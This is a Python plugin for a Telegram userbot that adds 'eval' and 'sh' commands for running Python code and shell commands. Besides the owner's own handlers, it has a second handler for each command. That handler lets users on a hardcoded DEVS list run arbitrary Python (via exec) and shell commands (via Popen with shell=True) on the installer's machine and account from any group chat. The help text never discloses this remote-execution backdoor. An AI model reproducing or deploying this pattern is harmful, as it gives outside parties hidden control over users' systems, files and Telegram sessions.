import traceback, sys, os, time
from subprocess import Popen, PIPE, TimeoutExpired
from io import StringIO

from pyrogram.types import Message
from pyrogram import Client, filters

from .. import HANDLER, DEVS
from ..utils.basic import eor
from .help import HELP_CMD


async def aexec(code, client, message):
    exec(
        f"async def __aexec(client, message): "
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@Client.on_message(filters.group & filters.command(
    ["eval", "e"], ["?"]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command(["eval", "e"], HANDLER) & filters.me)
async def eval(client, message):
    teks = message.text.split(maxsplit=1)[1]
    xxx = time.perf_counter()
    status_message = await eor(message, "`Running ...`")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        await status_message.delete()
        return
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    yyy = time.perf_counter()
    final_output = f"⇒ <b>EVAL</b>:\n<code>{teks}</code>\n\n⇒ <b>OUTPUT</b>:\n<code>{evaluation.strip()}</code>\n\n<b>Completed in</b> <code>{round(yyy - xxx, 5)} s</code>."
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(final_output))
        await client.send_document(
            message.chat.id,
            document=filename,
            caption=f"⇒ <b>EVAL</b>:\n<code>{cmd}</code>",
            disable_notification=True,
        )
        os.remove(filename)
        await status_message.delete()
    else:
        await status_message.edit(final_output)


@Client.on_message(filters.group & filters.command("bash", ["?"])
                  & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command(["shell",
                  "sh", "bash"], HANDLER) & filters.me)
async def shell(client, message: Message):
    if len(message.command) < 2:
        return await message.edit("<b>Specify the command in message text!</b>")
    teks = message.text.split(maxsplit=1)[1]
    command = Popen(
        teks,
        shell=True,
        stdout=PIPE,
        stderr=PIPE,
        text=True,
    )

    xyz = "#" if os.getuid() == 0 else "$"
    text = f"<b>{xyz}</b> <code>{teks}</code>\n\n"

    await message.edit(text + "<b>Running...</b>")
    try:
        start = time.perf_counter()
        stdout, stderr = command.communicate(timeout=60)
    except TimeoutExpired:
        text += "<b>Timeout expired (60 seconds)</b>"
    else:
        end = time.perf_counter()
        if stdout:
            text += "<b>OUTPUT:</b>\n" f"<code>{stdout}</code>\n\n"
        if stderr:
            text += "<b>ERROR:</b>\n" f"<code>{stderr}</code>\n\n"
        text += f"<b>Completed in</b> <code>{round(end - start, 5)} s</code>."
    await message.edit(text)
    command.kill()


PLUGIN_NAME = os.path.basename(__file__.replace(".py", ""))
HELP_CMD.update({
    PLUGIN_NAME: {
        f'eval': 'Mengeksekusi kode python.',
        f'sh': 'Menjalankan perintah linux.'
    }
})
